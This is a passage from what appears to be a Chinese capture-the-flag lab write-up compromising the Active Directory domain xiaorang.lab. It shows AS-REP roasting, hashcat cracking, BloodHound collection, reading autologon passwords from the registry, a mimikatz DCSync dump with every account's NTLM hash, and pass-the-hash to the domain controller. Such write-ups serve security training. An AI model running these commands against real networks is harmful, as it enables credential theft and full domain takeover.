    # 默认输入文件
    input_file = 'dbdump.txt'
    output_file = 'usernames.txt'

    # 如果提供了命令行参数
    if len(sys.argv) >= 2:
        input_file = sys.argv[1]
    if len(sys.argv) >= 3:
        output_file = sys.argv[2]

    print(f"正在从 {input_file} 提取用户名...")
    print(f"输出到 {output_file}")
    print("-" * 50)

    success = extract_usernames(input_file, output_file)

    if success:
        print("-" * 50)
        print("完成！")
    else:
        print("提取失败！")


if __name__ == '__main__':
    main()
```

我们开始探测。

```bash
proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 xiaorang.lab/ -usersfile usernames.txt
```

我们探测到有一个账户是存在的，我们去尝试爆破它的密码。

```plaintext
$krb5asrep$23$zhangxin@XIAORANG.LAB:6b832e6374e02cea372036b52a858b5d$6d7892a3cfed3b53bcfeda4ba161c7dd01bbc74050cedca9b6be13bf819eef3b2240f87254ea2f495a1abf52129404e77d21f192034cc33f3d4d8a4cf8c82ed1349c9b104a44cbded3bd29723c9f14dd8ebec5ae6ed534e435e40f55479a9999d6529be180b71f60094a3b77d0d587f4b1b19dfcf5b82fd5dd9a05d10027d2eedd857667d904d3f3087a456a099a87732788c98db26f2064a48522d475a495fc0a2126e76e4829b7a0294c6634d408f1a1da9a631f30e49a5c3aaeb82b25eec69f07ef7517fc95cb47f55a85b591f69a4d620fbbcd12ab838ae3262a3ba0b5ca0d5cee3d9ada306797503e25
```

用 hashcat 爆破。

```bash
hashcat hashs.txt /usr/share/wordlists/rockyou.txt --show
```

![](../assets/892bde5f-ac4c-40f0-96ac-27d8fcd5f490.png)

```bash
hashcat -a 0 -m 18200 hashs.txt /usr/share/wordlists/rockyou.txt
```

查看结果。

```bash
hashcat -a 0 -m 18200 hashs.txt /usr/share/wordlists/rockyou.txt --show
```

结果如下。

```plaintext
$krb5asrep$23$zhangxin@XIAORANG.LAB:6b832e6374e02cea372036b52a858b5d$6d7892a3cfed3b53bcfeda4ba161c7dd01bbc74050cedca9b6be13bf819eef3b2240f87254ea2f495a1abf52129404e77d21f192034cc33f3d4d8a4cf8c82ed1349c9b104a44cbded3bd29723c9f14dd8ebec5ae6ed534e435e40f55479a9999d6529be180b71f60094a3b77d0d587f4b1b19dfcf5b82fd5dd9a05d10027d2eedd857667d904d3f3087a456a099a87732788c98db26f2064a48522d475a495fc0a2126e76e4829b7a0294c6634d408f1a1da9a631f30e49a5c3aaeb82b25eec69f07ef7517fc95cb47f55a85b591f69a4d620fbbcd12ab838ae3262a3ba0b5ca0d5cee3d9ada306797503e25:strawberry
```

我们尝试登录，成功 RDP 到 `172.22.6.25` 上面。

```plaintext
xiaorang.lab\zhangxin:strawberry
```

先信息收集，用 BloodHound 收集一手。

```bash
proxychains4 bloodhound-python -c all -u zhangxin -p strawberry -d xiaorang.lab -ns 172.22.6.12 --zip --dns-tcp
```

我们筛选发现 `YUXUAN@XIAORANG.LAB` 这个账户在域内具有较高的权限，`HasSIDHistory` 意味则着这个账户继承了 ADMINISTRATOR 的所有权限。

> [!tips]
> SIDHistory 是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的 SID 作为该对象的 objectSid，在之前域中的 SID 会添加到该对象的 SIDHistory 属性中，此时该对象将保留在原来域的 SID 对应的访问权限

![](../assets/e4a2123d-61e4-4427-b30d-c76152c8f3ed.png)

![](../assets/44c96870-6d2d-4ae9-b50d-8c4f8f54893b.png)

我们尝试去获取这个用户的 hash 值登录，但是因为权限不够，无法导出 hash。

```cmd
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit > all.csv
```

但是，经过搜索，我们发现某些账户可能存在自动登录，我们要用以下命令查询目标账户。

```cmd
# 检查是否开启自动登录
reg query "\\目标机器名\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon

# 查看自动登录的域名、用户名和密码（如果存在）
reg query "\\目标机器名\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "\\目标机器名\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "\\目标机器名\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

下面，我们来查下 `YUXUAN@XIAORANG.LAB` 是否存在自动登录。

```cmd
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

结果如下。

![](../assets/c760e3b7-2ded-4a2a-bc33-fb8f1168af76.png)

我们直接可以得到 `YUXUAN@XIAORANG.LAB` 登录的账户密码是 `xiaorang.lab\yuxuan:Yuxuan7QbrgZ3L`。

```plaintext
AutoLogonSID    REG_SZ    S-1-5-21-3623938633-4064111800-2925858365-1180
LastUsedUsername    REG_SZ    yuxuan
AutoAdminLogon    REG_SZ    1
DefaultUserName    REG_SZ    yuxuan
DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L
DefaultDomainName    REG_SZ    xiaorang.lab
```

我们成功登录，并导出 hash。

```cmd
mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit > all.csv
```

结果如下。

```plaintext

  .#####.   mimikatz 2.2.0 (x86) #18362 Feb 29 2020 11:13:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC-PROGAME.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
1103	shuzhen	07c1f387d7c2cf37e0ca7827393d2327	512
1104	gaiyong	52c909941c823dbe0f635b3711234d2e	512
1106	xiqidi	a55d27cfa25f3df92ad558c304292f2e	512
1107	wengbang	6b1d97a5a68c6c6c9233d11274d13a2e	512
1108	xuanjiang	a72a28c1a29ddf6509b8eabc61117c6c	512
1109	yuanchang	e1cea038f5c9ffd9dc323daf35f6843b	512
1110	lvhui	f58b31ef5da3fc831b4060552285ca54	512
1111	wenbo	9abb7115997ea03785e92542f684bdde	512
1112	zhenjun	94c84ba39c3ece24b419ab39fdd3de1a	512
1113	jinqing	4bf6ad7a2e9580bc8f19323f96749b3a	512
1115	yangju	1fa8c6b4307149415f5a1baffebe61cf	512
1117	weicheng	796a774eace67c159a65d6b86fea1d01	512
1118	weixian	8bd7dc83d84b3128bfbaf165bf292990	512
1119	haobei	045cc095cc91ba703c46aa9f9ce93df1	512
1120	jizhen	1840c5130e290816b55b4e5b60df10da	512
1121	jingze	3c8acaecc72f63a4be945ec6f4d6eeee	512
1122	rubao	d8bd6484a344214d7e0cfee0fa76df74	512
1123	zhaoxiu	694c5c0ec86269daefff4dd611305fab	512
1124	tangshun	90b8d8b2146db6456d92a4a133eae225	512
1125	liangliang	c67cd4bae75b82738e155df9dedab7c1	512
1126	qiyue	b723d29e23f00c42d97dd97cc6b04bc8	512
1127	chouqian	c6f0585b35de1862f324bc33c920328d	512
1128	jicheng	159ee55f1626f393de119946663a633c	512
1129	xiyi	ee146df96b366efaeb5138832a75603b	512
1130	beijin	a587b90ce9b675c9acf28826106d1d1d	512
1131	chenghui	08224236f9ddd68a51a794482b0e58b5	512
1132	chebin	b50adfe07d0cef27ddabd4276b3c3168	512
1133	pengyuan	a35d8f3c986ab37496896cbaa6cdfe3e	512
1134	yanglang	91c5550806405ee4d6f4521ba6e38f22	512
1135	jihuan	cbe4d79f6264b71a48946c3fa94443f5	512
1136	duanmuxiao	494cc0e2e20d934647b2395d0a102fb0	512
1137	hongzhi	f815bf5a1a17878b1438773dba555b8b	512
1138	gaijin	b1040198d43631279a63b7fbc4c403af	512
1139	yifu	4836347be16e6af2cd746d3f934bb55a	512
1140	fusong	adca7ec7f6ab1d2c60eb60f7dca81be7	512
1141	luwan	c5b2b25ab76401f554f7e1e98d277a6a	512
1142	tangrong	2a38158c55abe6f6fe4b447fbc1a3e74	512
1143	zhufeng	71e03af8648921a3487a56e4bb8b5f53	512
1145	dongcheng	f2fdf39c9ff94e24cf185a00bf0a186d	512
1146	lianhuangchen	23dc8b3e465c94577aa8a11a83c001af	512
1147	lili	b290a36500f7e39beee8a29851a9f8d5	512
1148	huabi	02fe5838de111f9920e5e3bb7e009f2f	512
1149	rangsibo	103d0f70dc056939e431f9d2f604683c	512
1150	wohua	cfcc49ec89dd76ba87019ca26e5f7a50	512
1151	haoguang	33efa30e6b3261d30a71ce397c779fda	512
1152	langying	52a8a125cd369ab16a385f3fcadc757d	512
1153	diaocai	a14954d5307d74cd75089514ccca097a	512
1154	lianggui	4ae2996c7c15449689280dfaec6f2c37	512
1155	manxue	0255c42d9f960475f5ad03e0fee88589	512
1156	baqin	327f2a711e582db21d9dd6d08f7bdf91	512
1157	chengqiu	0d0c1421edf07323c1eb4f5665b5cb6d	512
1158	louyou	a97ba112b411a3bfe140c941528a4648	512
1159	maqun	485c35105375e0754a852cee996ed33b	512
1160	wenbiao	36b6c466ea34b2c70500e0bfb98e68bc	512
1161	weishengshan	f60a4233d03a2b03a7f0ae619c732fae	512
1163	chuyuan	0cfdca5c210c918b11e96661de82948a	512
1164	wenliang	a4d2bacaf220292d5fdf9e89b3513a5c	512
1165	yulvxue	cf970dea0689db62a43b272e2c99dccd	512
1166	luyue	274d823e941fc51f84ea323e22d5a8c4	512
1167	ganjian	7d3c39d94a272c6e1e2ffca927925ecc	512
1168	pangzhen	51d37e14983a43a6a45add0ae8939609	512
1169	guohong	d3ce91810c1f004c782fe77c90f9deb6	512
1170	lezhong	dad3990f640ccec92cf99f3b7be092c7	512
1171	sheweiyue	d17aecec7aa3a6f4a1e8d8b7c2163b35	512
1172	dujian	8f7846c78f03bf55685a697fe20b0857	512
1173	lidongjin	34638b8589d235dea49e2153ae89f2a1	512
1174	hongqun	6c791ef38d72505baeb4a391de05b6e1	512
1175	yexing	34842d36248c2492a5c9a1ae5d850d54	512
1176	maoda	6e65c0796f05c0118fbaa8d9f1309026	512
1177	qiaomei	6a889f350a0ebc15cf9306687da3fd34	512
502	krbtgt	a4206b127773884e2c7ea86cdd282d9c	514
1178	wenshao	b31c6aa5660d6e87ee046b1bb5d0ff79	4260352
500	Administrator	04d93ffd6f5f6e4490e0de23f240a5e9	512
1000	DC-PROGAME$	ae7d96208b08e317ea995531ce351443	532480
1181	WIN2019$	ba925b0a49991fe5c28b014d280d1e8f	4096
1179	zhangxin	d6c5976e07cdb410be19b84126367e3d	4260352
1180	yuxuan	376ece347142d1628632d440530e8eed	66048

mimikatz(commandline) # exit
Bye!

```

然后我们打 hash 传递即可。

```bash
proxychains4 impacket-smbexec -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25 -codec gbk
```

命令执行。

```cmd
dir C:\Users\Administrator\flag
type C:\Users\Administrator\flag\flag03.txt
```

拿到第三个 flag。

```plaintext
flag03: flag{d36c1de8-0dde-4ec5-af6c-1ba53bd66cf0}


Maybe you can find something interesting on this server.
=======================================
What you may not know is that many objects in this domain
are moved from other domains.
```

## flag 4

最后 hash 传递直接上 DC 即可。

```bash
proxychains4 impacket-smbexec -hashes :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 -codec gbk
```

命令执行。

```cmd
dir C:\Users\Administrator\flag
type C:\Users\Administrator\flag\flag04.txt
```

结果如下，至此完成全部挑战。

```plaintext
Awesome! you got the final flag.

::::::::::::::::::::::::::    :::: ::::::::::
    :+:        :+:    +:+:+: :+:+:+:+:
    +:+        +:+    +:+ +:+:+ +:++:+
    +#+        +#+    +#+  +:+  +#++#++:++#
    +#+        +#+    +#+       +#++#+
    #+#        #+#    #+#       #+##+#
    ###    ##############       #############


flag04: flag{a7b5d035-4b7b-4fa2-aa31-c8816fa4a22d}
```

